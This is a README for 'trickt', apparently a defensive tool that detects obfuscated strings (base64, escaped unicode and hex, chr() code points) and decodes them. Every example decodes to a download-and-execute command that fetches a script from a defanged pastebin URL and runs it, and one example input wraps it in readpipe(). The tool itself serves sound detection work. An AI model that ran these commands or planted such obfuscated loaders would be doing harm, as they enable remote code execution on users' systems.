# trickt
Finds and converts obfuscated strings into a human readable form.

## Install

```bash
# COMING SOON
$ pip3 install trickt
```

## Run

### Searching individual strings

Base64
```bash

$ trickt Y3VybCBoeHhwczovL3Bhc3RlYmluLmNvbS9yYXcvYmFzZTY0X2VuY29kZWQgPiBiYWRfZmlsZS5zaCAmJiAuL2JhZF9maWxlLnNoCg==

Searching string for trickiness...

line 1::base64>  curl hxxps://pastebin.com/raw/base64_encoded > bad_file.sh && ./bad_file.sh
```
Escaped unicode
```bash
$ trickt '\u0063\u0075\u0072\u006c\u0020\u0068\u0078\u0078\u0070\u0073\u003a\u002f\u002f\u0070\u0061\u0073\u0074\u0065\u0062\u0069\u006e\u002e\u0063\u006f\u006d\u002f\u0072\u0061\u0077\u002f\u0065\u0073\u0063\u0061\u0070\u0065\u0064\u005f\u0075\u006e\u0069\u0063\u006f\u0064\u0065\u0020\u003e\u0020\u0062\u0061\u0064\u005f\u0066\u0069\u006c\u0065\u002e\u0073\u0068\u0020\u0026\u0026\u0020\u002e\u002f\u0062\u0061\u0064\u005f\u0066\u0069\u006c\u0065\u002e\u0073\u0068'

Searching string for trickiness...

line 1::escaped_unicode>  curl hxxps://pastebin.com/raw/escaped_unicode > bad_file.sh && ./bad_file.sh
```
Escaped hex
```bash
$ trickt '\x63\x75\x72\x6C\x20\x68\x78\x78\x70\x73\x3A\x2F\x2F\x70\x61\x73\x74\x65\x62\x69\x6E\x2E\x63\x6F\x6D\x2F\x72\x61\x77\x2F\x65\x73\x63\x61\x70\x65\x64\x5F\x68\x65\x78\x20\x3E\x20\x62\x61\x64\x5F\x66\x69\x6C\x65\x2E\x73\x68\x20\x26\x26\x20\x2E\x2F\x62\x61\x64\x5F\x66\x69\x6C\x65\x2E\x73\x68'

Searching string for trickiness...

line 1::escaped_unicode>  curl hxxps://pastebin.com/raw/escaped_hex > bad_file.sh && ./bad_file.sh

```
Code points
```bash
$ trickt 'chr(99) . chr(117) . chr(114) . chr(108) . chr(32) . chr(104) . chr(120) . chr(120) . chr(112) . chr(115) . chr(58) . chr(47) . chr(47) . chr(112) . chr(97) . chr(115) . chr(116) . chr(101) . chr(98) . chr(105) . chr(110) . chr(46) . chr(99) . chr(111) . chr(109) . chr(47) . chr(114) . chr(97) . chr(119) . chr(47) . chr(99) . chr(111) . chr(100) . chr(101) . chr(95) . chr(112) . chr(111) . chr(105) . chr(110) . chr(116) . chr(115) . chr(32) . chr(62) . chr(32) . chr(98) . chr(97) . chr(100) . chr(95) . chr(102) . chr(105) . chr(108) . chr(101) . chr(46) . chr(115) . chr(104) . chr(32) . chr(38) . chr(38) . chr(32) . chr(46) . chr(47) . chr(98) . chr(97) . chr(100) . chr(95) . chr(102) . chr(105) . chr(108) . chr(101) . chr(46) . chr(115) . chr(104)'

Searching string for trickiness...

line 1::code_point>  curl hxxps://pastebin.com/raw/code_points > bad_file.sh && ./bad_file.sh
```

### Searching an entire file

```bash
$ cat my_bad_file

this line isn't bad
Y3VybCBoeHhwczovL3Bhc3RlYmluLmNvbS9yYXcvYmFzZTY0X2VuY29kZWQgPiBiYWRfZmlsZS5zaCAmJiAuL2JhZF9maWxlLnNoCg==
this one isn't
not this one either
<element><element2>\u0063\u0075\u0072\u006c\u0020\u0068\u0078\u0078\u0070\u0073\u003a\u002f\u002f\u0070\u0061\u0073\u0074\u0065\u0062\u0069\u006e\u002e\u0063\u006f\u006d\u002f\u0072\u0061\u0077\u002f\u0065\u0073\u0063\u0061\u0070\u0065\u0064\u005f\u0075\u006e\u0069\u0063\u006f\u0064\u0065\u0020\u003e\u0020\u0062\u0061\u0064\u005f\u0066\u0069\u006c\u0065\u002e\u0073\u0068\u0020\u0026\u0026\u0020\u002e\u002f\u0062\u0061\u0064\u005f\u0066\u0069\u006c\u0065\u002e\u0073\u0068</element2></element>
skip a bad one here
my_hex = '\x63\x75\x72\x6C\x20\x68\x78\x78\x70\x73\x3A\x2F\x2F' + '\x70\x61\x73\x74\x65\x62\x69\x6E\x2E\x63\x6F\x6D\x2F' + '\x72\x61\x77\x2F\x65\x73\x63\x61\x70\x65\x64\x5F\x68\x65\x78\x20\x3E\x20\x62\x61\x64\x5F\x66\x69\x6C\x65' + '\x2E\x73\x68\x20\x26\x26\x20\x2E\x2F\x62\x61\x64\x5F\x66\x69' + '\x6C\x65\x2E\x73\x68'
nothing here
and some script to like readpipe(chr(99) . chr(117) . chr(114) . chr(108) . chr(32) . chr(104) . chr(120) . chr(120) . chr(112) . chr(115) . chr(58) . chr(47) . chr(47) . chr(112) . chr(97) . chr(115) . chr(116) . chr(101) . chr(98) . chr(105) . chr(110) . chr(46) . chr(99) . chr(111) . chr(109) . chr(47) . chr(114) . chr(97) . chr(119) . chr(47) . chr(99) . chr(111) . chr(100) . chr(101) . chr(95) . chr(112) . chr(111) . chr(105) . chr(110) . chr(116) . chr(115) . chr(32) . chr(62) . chr(32) . chr(98) . chr(97) . chr(100) . chr(95) . chr(102) . chr(105) . chr(108) . chr(101) . chr(46) . chr(115) . chr(104) . chr(32) . chr(38) . chr(38) . chr(32) . chr(46) . chr(47) . chr(98) . chr(97) . chr(100) . chr(95) . chr(102) . chr(105) . chr(108) . chr(101) . chr(46) . chr(115) . chr(104)) which I hope you don't catch
that's all
```
```bash
$ trickt my_bad_file.txt

Searching file 'my_bad_file.txt' for trickiness...

line 2::base64>  curl hxxps://pastebin.com/raw/base64_encoded > bad_file.sh && ./bad_file.sh

line 5::escaped_unicode>  curl hxxps://pastebin.com/raw/escaped_unicode > bad_file.sh && ./bad_file.sh

line 7::escaped_unicode>  curl hxxps://pastebin.com/raw/escaped_hex > bad_file.sh && ./bad_file.sh

line 9::code_point>  curl hxxps://pastebin.com/raw/code_points > bad_file.sh && ./bad_file.sh
```